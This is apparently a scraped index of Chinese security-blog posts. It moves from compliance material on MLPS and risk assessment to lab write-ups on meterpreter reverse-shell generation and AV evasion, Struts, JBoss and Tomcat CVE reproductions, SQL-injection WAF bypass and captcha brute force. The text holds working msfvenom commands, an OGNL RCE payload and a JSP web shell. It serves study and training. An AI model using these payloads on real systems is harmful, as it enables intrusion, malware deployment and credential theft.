等级保护概念 信息安全等级保护是指对国家秘密信息、法人和其他组织及公民的专有信息以及公开信息和存储、传输、处理这些信息的信息系统分等级实行安全保护，对信息系统中使用的信息安全产品实行按等级管理，对信息系统中发生的信息安全事件分等级响应、处置。\n1.2 等级保护依据 等级保护工作开展的依据是《中华人民共和国网络安全法》\n第二十一条\n国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少 于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。\n第三十一条\n国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。\n伴随着《中华人民共和国网络安全法》的正式发布和实施，等级保护制度从一个规范性动作上升到了法律层面，确立了其在网络安全领域的基础、核心地位。简而言之，关键信息基础设施相关单位不按要求履行等保测评工作即是违法行为。\n1.3 为什么要强制实行等级保护 国家强制推进实行等保制度的原因来自内、外两个部分：\n内部因素：随着信息化建设工作的发展和推进，网络安全工作也需要同步推进，以此来保障国家重要行业和关键环节的安全系数。 外部因素：攻击技术不断发展和迭代，境外敌对势力的入侵形势日益严峻。 1.4 等级保护对象 等级保护对象是指网络安全等级保护工作中的对象，通常是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统，主要包括基础信息网络、云计算平台/系统、大数据应用/平台/资源、物联网(IoT)、工业控制系统和采用移动互联技术的系统等（简称：云大物移工）。\n1.5 安全保护等级 等级保护对象根据其在国家安全，经济建设，社会生活中的重要程度，遭到破坏后对国家安全、社会秩序、公共利益以及公民、法人和其他组织的合法权益的危害程度等，由低到高被划分为五个安全保护等级。\n第五个等级涉及国家安全，未在国标文件列出具体内容，且普通人一般基础不到\n等级 定义 安全保护能力 第一 级： 用户 自主 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益造成损害，但不 损害国家安全、社会秩序和 公共利益。 应能够防护免受来自个人的、拥有很少资源的威胁源发 起的恶意攻击、一般的自然灾难，以及其他相当危害程 度的威胁所造成的关键资源损害，在自身遭到损害后， 能够恢复部分功能。 第二 级： 系统 审计 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益产生严重损害， 或者对社会秩序和公共利益 造成损害，但不损害国家安 全。 应能够防护免受来自外部小型组织的、拥有少量资源的 威胁源发起的恶意攻击、一般的自然灾难，以及其他相 当危害程度的威胁所造成的重要资源损害，能够发现重 要的安全漏洞和处置安全事件，在自身遭到损害后，能 够在一段时间内恢复部分功能。 第三 级： 安全 标记 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益产生特别严重损 害，或者对社会秩序和公共 利益造成严重损害，或者对 国家安全造成损害。 应能够在统一安全策略下防护免受来自外部有组织的团 体、拥有较为丰富资源的威胁源发起的恶意攻击、较为 严重的自然灾难，以及其他相当危害程度的威胁所造成 的主要资源损害,能够及时发现、监测攻击行为和处置 安全事件，在自身遭到损害后，能够较快恢复绝大部分 功能。 第四 级： 结构 化保 护级 等级保护对象受到破坏后， 会对社会秩序和公共利益造 成特别严重损害，或者对国 家安全造成严重损害。 应能够在统一安全策略下防护免受来自国家级别的、敌 对组织的、拥有丰富资源的威胁源发起的恶意攻击，严 重的自然灾难，,以及其他相当危害程度的威胁所造成 的资源损害，能够及时发现、监测发现攻击行为和安全 事件，在自身遭到损害后﹐能够迅速恢复所有功能。 第五 级： 访问 验证 保护 级 等级保护对象受到破坏后， 会对国家安全造成特别严重 损害。 略 1.6 等级保护角色\u0026amp;职责 等级保护管理部门： 等级保护管理部门依照等级保护相关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。如：公安机关、国家保密局、国家密码局等；\n主管部门： 负责依照国家网络安全等级保护的管理规范和技术标准，督促、检查和指导本行业、本部门或者本地区等级保护对象运营、使用单位的网络安全等级保护工作。 如：教育部或者所在地区的教育局；\n运营、使用单位： 就是需要做等保测评的相关单位，如医院，学校，xx科技公司等；\n网络安全服务机构： 可以协助测评对象做相应等保动作的相关单位，如：深信服、赛可达实验室、国家计算机网络应急技术处理协调中心等；\n网络安全等级测评机构： 等保测评经公安部认证的具有资质的测评机构，依据国家信息安全等级保护规范规定，受有关单位委托，按照有关管理规范和技术标准，对信息系统安全等级保护状况进行检测评估的活动。简单理解为公安部授权的可以对测评对象发放证书的单位，如果想查询具备等保测评资质的厂商，可以访问网络安全等级保护网，在信息查询栏目中，点击全国网络安全等级测评与检测评估机构目录，可以看到各省市的测评机构名单和联系方式。\n网络安全产品供应商： 提供相关安全产品的厂商，如：360、深信服、天融信、启明星辰、绿盟等；\n1.7 等级保护规定动作 定级： 自主定级、专家评审、主管部门审批、公安机关审核监督。\n备案： 定级工作完成后，经过专家评审、行业主管部门审核后，报送所在地公安机关进行备案。\n安全建设或整改： 信息系统的安全保护等级确定后，运营、使用单位应当按照国家信息安全等级保护管理规范和技术标准，使用符合国家有关规定，满足信息系统安全保护等级需求的信息技术产品，开展信息系统安全建设或者改建工作。\n等级测评： 信息系统建设完成后，运营、使用单位或者其主管部门应当选择符合本办法规定条件的测评机构，依据《信息系统安全等级保护测评要求》等技术标准，定期对信息系统安全等级状况开展等级测评。\n监督检查： 信息系统运营、使用单位及其主管部门定期对信息系统安全状况、安全保护制度及措施的落实情况进行自查。受理备案的公安机关定期对备案系统的等级保护工作情况进行检查，若存在违规项，下发整改通知，必要时会采取规定处罚措施。\n1.8 基本实施流程 系统定级： 信息系统运营使用单位或主管部门按照《信息安全等级保护管理办法》和《网络安全等级保护定级指南》，初步确定定级对象的安全保护等级，起草《网络安全等级保护定级报告》；二级以上系统，定级结论需要进行专家评审、主管部门审核和备案。 系统备案： 信息系统安全保护等级为第二级以上时，备案时应当提交《网络安全等级保护备案表》和定级报告；第三级以上系统，还需提交专家评审意见、系统拓扑和说明、安全管理制度、安全建设方案等。公安机关一般会在10日内给予反馈，如果备案通过，会发放备案证明；如果备案不通过，需要重新定级。 系统初测： 测评机构按照管理规范和技术标准，运用科学的手段和方法，对处理特定应用的信息系统，采用安全技术测评和安全管理测评方式，对保护状况进行初步检测评估，针对安全不符合项提出安全整改建议。 等保整改： 依据《网络安全等级保护基本要求》，利用自有或第三方的安全产品和专家服务，对信息系统进行安全建设和整改，同时制定相应的安全管理制度。整改主要分为管理整改和技术整改。 复测获得报告： 运营使用单位应当选择合适的测评机构，依据《网络安全等级保护测评要求》等技术标准，定期对信息系统安全等级状况开展等级测评。测评结论分为优（90分及以上）、良（80分及以上）、中（70分及以上）、差（低于70分），70分以上才算基本符合要求。 监督检查： 向当地公安机关网安部门提交测评报告，配合完成对网络安全等级保护实施情况的检查。公安机关及其他监管部门会在整个过程中，履行相应的监管、审核和检查等职责。 2 风险评估 信息安全风险评估就是从风险管理角度，运用科学的方法和手段，系统地分析信息系统所面临的威胁及其存在的脆弱性，评估安全事件一旦发生可能造成的危害程度，提出有针对性的抵御威胁的防护对策和整改措施，为防范和化解信息安全风险，将风险控制在可接受的水平，最大限度地保障信息安全提供科学依据\n2.1 风险评估准备 确定风险评估的目标、范围、方法、标准和责任； 收集风险评估所需的内外部信息，包括历史数据和未来预测； 筛选、提炼、对比、分类、组合信息，以便进行风险评估。 2.2 资产识别 识别风险评估对象的资产，包括物理资产、信息资产、人力资产等； 确定资产的价值、重要性、敏感性等属性； 确定资产的所有者和使用者。 2.3 威胁识别 识别可能对资产造成损害或影响的威胁，包括自然威胁、人为威胁等； 确定威胁的来源、类型、频率、强度等特征； 确定威胁发生的条件和触发因素。 2.4 脆弱性识别 识别资产存在的脆弱性，即可能被威胁利用的缺陷或漏洞； 确定脆弱性的程度、范围、持续时间等特征； 确定脆弱性产生的原因和影响因素。 2.5 已有安全措施的确认 确认已经采取或计划采取的安全措施，包括技术措施、管理措施、法律措施等； 确定安全措施的有效性、合理性、成本效益等属性； 确定安全措施对威胁和脆弱性的影响程度。 2.6 风险分析和交付风险评估记录 分析风险发生的可能性和影响程度，确定风险水平； 比较风险水平和风险承受度，确定风险是否可接受； 制定风险应对策略，包括风险承担、规避、转移、减轻等； 编制风险评估报告，记录风险评估过程和结果，提出风险管理建议。 3 总结 等级保护、风险评估和安全测评区别是什么？\n等级保护是指对涉及国计民生的网络和信息系统按其重要程度及实际安全需求进行分等级保护，对网络和信息系统中使用的安全产品实行按等级管理，对网络和信息系统中发生的信息安全事件进行分等级响应、处置。它是保障国家网络和信息安全的基本制度、基本策略、基本方法。等级保护的核心是对信息系统特别是对业务应用系统安全分等级、按标准进行建设、管理和监督。国家对信息安全等级保护工作运用法律和技术规范逐级加强监管力度。 风险评估是指，在风险事件发生之前或之后(但还没有结束)，该事件给人们的生活、生命、财产等各个方面造成的影响和损失的可能性进行量化评估的工作。从信息安全的角度来讲，风险评估是对信息资产所面临的威胁、存在的弱点、造成的影响，以及三者综合作用所带来风险的可能性的评估。作为风险管理的基础，风险评估是组织确定信息安全需求的一个重要途径，属于组织信息安全管理体系策划的过程。 安全测评是指按照严格的程序对信息系统进行安全能力的综合测试评估活动，由正规、检验技术丰富且被政府授权资格的权威机构进行检查，帮助系统运行单位分析单位目前的安全运行状况、排查存在的安全问题，并提供改进建议降低系统的安全风险。 总之，等级保护是一种管理制度，风险评估是一种评价方法，安全测评是一种测试活动。三者都是为了提高信息系统的安全性能和防御能力，但侧重点和执行方式不同。\n","permalink":"https://senmer.github.io/zh/posts/tech/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/","summary":"\u003cp\u003e等级保护\u0026amp;风险评估：了解基本测评流程，知道各角色岗位在测评工作中的职责，学习国标文件\u003c/p\u003e","title":"等级保护\u0026风险评估"},{"content":"MSF编码器结合shellcode加载器进行免杀实验\n1 实验环境 软件名称 版本 IP kali 6.0.0-kali3-amd64 172.31.5.9 2 利用MSF实现免杀 免杀技术简介： 免杀技术全称为反杀毒技术， Anti-Virus 简称“免杀”，指是一种能使病毒木马免于被杀毒软件查杀的技术。免杀技术的涉猎面广泛，其中包含反汇编、逆向工程、系统漏洞等技术，内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。\n2.1 没有免杀的情况 直接生成一个木马文件5555.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 -f exe -o 5555.exe 将此文件拷贝到windows机器（开启防火墙），会被发现并处理\n将此木马文件上传到在线检测平台，观察到检测结果如下：\nhttps://www.virustotal.com/gui/home/upload\n2.2 启用MSF自带免杀功能 Meatsploit 框架下免杀的方式之一就是使用MSF编码器。其功能是对攻击载荷文件进行重新的排列编码，改变可执行文件中的代码形状，避免被杀软认出。MSF 编码器可以将原可执行程序重新编码，生成一个新的二进制文件，该文件运行后，MSF 编码器会将原始程序解码到内存中并执行。\n生成一个重新编码后的免杀程序6666.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 x86/shikata_ga_nai -i 20 -f exe -o 6666.exe 将文件拷贝至windows后，并没有被防火墙检测到。再次上传到在线检测平台 https://www.virustotal.com/gui/home/upload\n可以观察到免杀后比没有免杀前的效果更差了（实际上是因为各个防火墙已经升级了对这种免杀技术的检测和防护，因此免杀后实际上是增加了“我就是木马文件”的特征，更容易被检测到）\n2.3 利用shellcode加载器进行免杀 在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。\n参考链接：简述获取shellcode的几种方式 - FreeBuf网络安全行业门户\n生成一个shellcode文件crowsec.jpg\nmsfvenom -p windows/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 7 -b \u0026#39;\\x00\u0026#39; lhost=172.31.5.9 lport=7777 -f raw -o crowsec.jpg 可以被windows防火墙检测到\n将此文件上传进行检测 https://www.virustotal.com/gui/home/upload\n被检测到的结果少了许多，免杀有一定效果\nshellcode加载器（本次实验命名为ms.exe） 本身也算一个木马程序，将ms.exe上传检测结果如下：\n2.4 免杀木马利用 启动msf监听程序\n┌──(root㉿kali)-[~] └─# msfconsole -q msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost 172.31.5.9 lhost =\u0026gt; 172.31.5.9 msf6 exploit(multi/handler) \u0026gt; set lport 7777 lport =\u0026gt; 7777 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 172.31.5.9:7777 将加载器ms.exe和上文生成的木马文件防止在同一目录下（IP：172.31.5.1）：\n双击ms.exe，观察到成功获取远程机器的命令窗口\n","permalink":"https://senmer.github.io/zh/posts/tech/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/","summary":"\u003cp\u003eMSF编码器结合shellcode加载器进行免杀实验\u003c/p\u003e","title":"MSF编码器结合shellcode加载器实现免杀"},{"content":"JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）\n1 实验环境 软件名称 版本 部署方式 IP JBoss jboss-6.1.0.Final docker run -d -p 8085:8080 \u0026ndash;name JBoss docker.io/hackingpub/cve-2017-12149 176.122.183.173 2 漏洞原理 JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）\n该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤 器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致 了攻击者可以在服务器上执行任意代码。\n漏洞影响5.x和6.x版本的JBoss。\nJBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可 以在任何商业应用中免费使用。Java序列化：把Java对象转换为字节序列的过程。Java反序列化：指把 字节序列恢复为Java对象的过程。 Java序列化与反序列化作用：便于保存数据，或者进行数据传输。\n漏洞出现在 Jboss 的 HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，源码在 jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEBINF\\classes\\org\\jboss\\invocation\\http\\servlet目录下的ReadOnlyAccessFilter.class文件中，其中 doFilter函数代码查看方式 :\ndocker exec -it JBoss bash -c \u0026#39;cat /jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class\u0026#39; 3 漏洞复现 安装好环境之后，直接使用jboss反序列化工具打开，成功执行命令。\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/","summary":"\u003cp\u003eJBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）\u003c/p\u003e","title":"JBoss 5.x\u00266.x 反序列化漏洞（CVE 2017 12149）复现"},{"content":"S2-048 远程代码执行漏洞（CVE-2017-9791）\n1 实验环境 软件名称 版本 部署方式 IP Apache Struts latest docker run -d -p 8084:8080 \u0026ndash;name apache-struts docker.io/piesecurity/apache-struts2-cve-2017-5638 172.31.5.7 2 漏洞复现 打开链接：\nhttp://172.31.5.7:8084/integration/editGangster;jsessionid=768AAC20493D6CD33F9DF8EF6357FAFD 漏洞存在点：\n在Gangster Name输入表达式，其它位置任意填写\n${2*2} 发现表达式成功执行\n准备以下POC填入表单\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess? (#_memberAccess=#dm): ((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)) .(#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))). (#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec (\u0026#39;id\u0026#39;).getInputStream())).(#q)} #id 返回当前用户的信息 成功获取到当前用户的信息\n3 漏洞原理 影响版本: 2.0.0 - 2.3.32\n参考链接：Struts S2-048 RCE漏洞分析 - 鑄劍師 - 博客园 (cnblogs.com)\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/","summary":"\u003cp\u003eS2-048 远程代码执行漏洞（CVE-2017-9791）\u003c/p\u003e","title":"S2-048 远程代码执行漏洞（CVE-2017-9791）"},{"content":"Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）复现\n1 实验环境 软件名称 版本 部署方式 IP cve-2017-12615 latest docker run -d -p 8083:8080 \u0026ndash;name tomcat-cve docker.io/cved/cve-2017-12615 172.31.5.7 2 漏洞复现 开启burp抓包，访问 172.31.5.7:8083\n使用repeater 模块修改数据包，数据包内容如下：\n\u0026lt;% if(\u0026#34;user\u0026#34;.equals(request.getParameter(\u0026#34;pwd\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026#34;p\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026#34;); } %\u0026gt; 发送修改后的数据包，返回状态码为204，表示成功写入一个shell.jsp文件至服务器\n注意：tomcat本身不允许上传*.jsp文件，因此请求头行修改为/shell.jsp/\n该请求到服务器后，文件名不允许有/，/被丢弃。因此最终生成文件名为shell.jsp\n使用浏览器访问该程序，成功执行命令pwd（任意命令均可）\nhttp://172.31.5.7:8083/shell.jsp?pwd=user\u0026amp;p=pwd 3 漏洞原理 该漏洞主要是因为tomcat的web.xml配置文件中的readonly参数值为false，使得我们可以通过PUT方法写入文件\ndocker exec -it tomcat-cve bash -c \u0026#34;grep -A 2 readon conf/web.xml\u0026#34; 所以修复该漏洞的方式也简单，将readonly的值设置为true即可\n漏洞影响版本：Tomcat 7.0.0-7.0.79、8.5.19\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/","summary":"\u003cp\u003eTomcat PUT方法任意写文件漏洞（CVE-2017-12615）复现\u003c/p\u003e","title":"Tomcat任意写文件漏洞复现(CVE-2017-12615)"},{"content":"1 实验环境 软件名称 版本 部署方式 IP SQLmap latest 源码部署 172.31.5.7 DVWA latest docker run -d -p 80:80 \u0026ndash;name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 2 SQLmap简介 官方网站：http://sqlmap.org/， 下载地址：https://github.com/sqlmapproject/sqlmap/zipball/master\nSqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。\nsqlmap支持的数据库有：\nMySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB sqlmap支持五种不同的注入模式：\n1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页 面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 2 下载及安装 2.1 Linux git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap cd sqlmap python sqlmap.py --update # 更新 python sqlmap.py -hh # 查看帮助信息 2.2 windows 官网下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。\n2.2. kali 默认安装（自带）\n┌──(root㉿kali)-[~] └─# sqlmap --version 1.6.11#stable 3 参数详解 3.1 Target：目标 -u URL, --url=URL 目标URL (e.g.\u0026#34;http://www.site.com/vuln.php?id=1\u0026#34;)，使用-u或者--url -d DIRECT 直接连接数据库的连接字符串 -l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标 -x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标 -m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。 -g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理） -c CONFIGFILE 从配置ini文件中加载选项 -r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可 以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--forcessl参数来使用，或者可以在Host头后门加上:443 目标URL 参数：-u或者\u0026ndash;url 格式：http(s)://targeturl[:port]/[…] 例如：python sqlmap.py -u \u0026ldquo;","permalink":"https://senmer.github.io/zh/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/","summary":"","title":"SQLmap安装和使用"},{"content":"（1）MS08-067、MS10-018、MS17-010、CVE-2018-4878漏洞复现\n1 实验环境 软件名称 版本 部署方式 IP msf kali自带 172.31.5.9 window xp professional VMvare workstation 16 172.31.5.41 2 MS08-067 MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。\n如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。此漏洞可能用于进行蠕虫攻击。防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。\n","permalink":"https://senmer.github.io/zh/posts/tech/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","summary":"\u003cp\u003e（1）MS08-067、MS10-018、MS17-010、CVE-2018-4878漏洞复现\u003c/p\u003e","title":"MSF漏洞利用"},{"content":"（1）实现WAF安装与配置\n（2）分别在无WAF和有WAF的情况下，利用SQLMap进行注入，提供注入结果截图\n（3）在有WAF的情况下，手工注入出DVWA数据库中的user和password，提供注入过程说明文档\n1 实验环境 软件名称 版本 部署方式 IP safedog 官网下载安装包 172.31.5.40 dvwa phpStudy2018部署 172.31.5.40 SQLMap kali 自带 172.31.5.9 2 安装DVWA 注意：这里使用phpStudy 2018进行部署（尽量不要用最新版，问题较多）\n下载DVWA源码，防止于网站根目录下\n将DVWA\\config\\目录下的文件重命名为config.inc.php，并修改其中的数据库账号和密码为：root/root（根据实际情况填写）\n修改php.ini 中的两个参数为On\n以系统服务的方式启动apache和mysql\n访问 http://172.31.5.40/dvwa/ 进入DVWA安装界面\n点击Create/Reset Database安装成功后进入登陆界面（默认账号：admin/password）\n3 安装safedog 官网下载最新版安全狗Apache版本 http://free.safedog.cn/\n双击安装包进行安装，出现如下界面说明可以正常安装，如果服务名为空则不正常（没有以系统服务运行apache）\n4 SQLMap 注入DVWA数据库 将DVWA安全等级设置为Low\n4.1 未开启safedog时 打开sql注入模块，并获取URL以及登陆cookie\n使用sqlmap 对id参数进行注入\nsqlmap --batch -u \u0026#34;http://172.31.5.40/dvwa/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;security=low; PHPSESSID=5oe9garl47s6buhb0rc7iav6g3\u0026#34; -p id 注入成功\n4.2 开启safedog时 再次执行注入（注意要删除上一次注入的缓存文件），注入失败。检测到了被防火墙拦截\n手工注入 1\u0026rsquo; and \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\n提交后被安全狗拦截\n5 safedog 绕过 5.1 and 关键字绕过 内联注释：是MySQL为了保持与其他数据兼容，将MySQL中特有的语句放在/!\u0026hellip;/中，这些语句在不兼容 的数据库中不执行，而在MySQL自身却能识别。\n/*!11445*/ 表示版本号；从00000~99999 ，需要小于mysql当前的版本； 例如：mysql 5.6 ，则版本号需要小于 56000 才能执行成功\n这个版本号有很多可以多尝试几个，这个原理就是在mysql数据库当中/*！加上指定的版本号来执行sql 语句：\n1\u0026#39;/*!11445and*/\u0026#39;1\u0026#39;=\u0026#39;1 #成功绕过and关键字拦截 5.2 order by关键字绕过 1\u0026#39; order by 1 # 提交此参数会被拦截\n使用group by 替换\n1\u0026#39; group by 1 # 成功绕过order by关键字拦截\n多次尝试，当使用如下语句则报错，可知注入的列数为2\n1\u0026#39; group by 3 # 5.3 union 关键字绕过 %0A 表示回车\n%23 表示 #\n为防止URL二次编码，以下实验使用HackerBar插件进入注入绕过（%会被二次编码，失去本来的意义）\n使用union关键字，被拦截\n1\u0026#39; union select 1,2 --+ 使用以下注入注入参数\n1\u0026#39; regexp \u0026#34;%0A%23\u0026#34; /*!11144union %0A select */1,2 --+ 成功绕过union关键字拦截\n5.4 database 关键字绕过（获取库名） 尝试获取database()，发现被拦截\n1\u0026#39; regexp \u0026#34;%0A%23\u0026#34; /*!11144union %0A select */database(),2--+ 再次使用內联注释绕过database() 拦截，获取到数据库名为dvwa\n?id=-1\u0026#39; regexp \u0026#34;%0A%23\u0026#34;/*!11144union %0A select*/ 1,database(%0A /*!11144*/)--+ 5.5 user() 关键字绕过（获取用户名） -1\u0026#39; regexp \u0026#34;%0A%23\u0026#34;/*!11144union %0A select*/ user(%0A /*!11144*/),database(%0A /*!11144*/)--+ 5.6 获取所有库名 尝试获取所有的库名，发现information_schema.schemata被拦截\n分别对schema_name 和information_schema加上内联注释进行绕过（不清楚其中哪个被拦截，直接全加上）\n5.7 获取所有表 获取dvwa库里面所有的表名\n-1\u0026#39; union /*!--+/*%0aselect/*!1,*/ group_concat(column_name) /*!from*/ /*!--+/*%0ainformation_schema./*!columns*/ where table_name=\u0026#39;users\u0026#39; --+ 5.8 注入出账号密码 -1\u0026#39; union /*!--+/*%0aselect/*!1,*/ group_concat(concat_ws(0x7e,user,password)) /*!from*/ dvwa.users --+ 在线解密 https://www.cmd5.com/\n得到admin用户密码为password\n","permalink":"https://senmer.github.io/zh/posts/tech/waf/safedog_bypass/","summary":"\u003cp\u003e（1）实现WAF安装与配置\u003c/p\u003e\n\u003cp\u003e（2）分别在无WAF和有WAF的情况下，利用SQLMap进行注入，提供注入结果截图\u003c/p\u003e\n\u003cp\u003e（3）在有WAF的情况下，手工注入出DVWA数据库中的user和password，提供注入过程说明文档\u003c/p\u003e","title":"Safedog_bypass"},{"content":"（1）验证码绕过（on client）+ 验证码绕过（on server）\n（2）验证码绕过（on server）实验中，为什么burp拦截开启的状态下，通过Repeater进行重放不会刷新验证码，关闭拦截后才会刷新验证码？\n1 实验环境 软件名称 版本 部署方式 IP Pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 2 验证码介绍及分类 在安全领域，验证码主要分为两大类：操作验证码和身份验证码。\n验证码的主要作用：防止恶意暴力破解、恶意注册、刷票、论坛灌水等一切脚本行为。\n验证码的分类：手机短信、手机语音、通用文字、加减法、非通用文字、非通用文字加背景随机加拉 伸、无感知、滑动拼图、文字点选、图标点选、推理拼图、短信上行、语序点选、空间推理、语音验证 等等。\n3 验证码绕过（on client） 打开pikachu的暴力破解模块\n当未输入验证码的时候，提示“请输入验证码”：\n当输入错误验证码的时候提示“验证码输入错误”：\n当输入正确验证码（账号随意输入）的时候提示“用户名或者密码不存在”：\n开启burp抓包，多次修改密码，使用repeater模块发送后，均返回状态码200，说明同一验证码可使用多次\n使用intruder模块对password进行爆破，成功拿到密码\n通过浏览器查看，可知该验证码由前端生成，因此还可通过禁用前端js功能进行绕过\n禁用js也可绕过验证码登录\n4 验证码绕过（on server） 截获数据包\n使用repeater模块，输入任意验证码提示：验证码错误\n在输入正确的二维码的情况下，并多次修改密码，提示：username or password is not exists～\n说明二维码是可以重复多次使用的（可以暴力破解）\n使用暴力破解，成功破解密码\n查看源码\ndocker exec pikachu bash -c \u0026#39;cat /app/vul/burteforce/bf_server.php\u0026#39; 可以发现，后端在使用验证码后，未进行销毁\n","permalink":"https://senmer.github.io/zh/posts/tech/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/","summary":"\u003cp\u003e（1）验证码绕过（on client）+ 验证码绕过（on server）\u003c/p\u003e\n\u003cp\u003e（2）验证码绕过（on server）实验中，为什么burp拦截开启的状态下，通过Repeater进行重放不会刷新验证码，关闭拦截后才会刷新验证码？\u003c/p\u003e","title":"验证码绕过"},{"content":"（1）密码修改逻辑漏洞\n1 实验环境 软件名称 版本 部署方式 IP webug 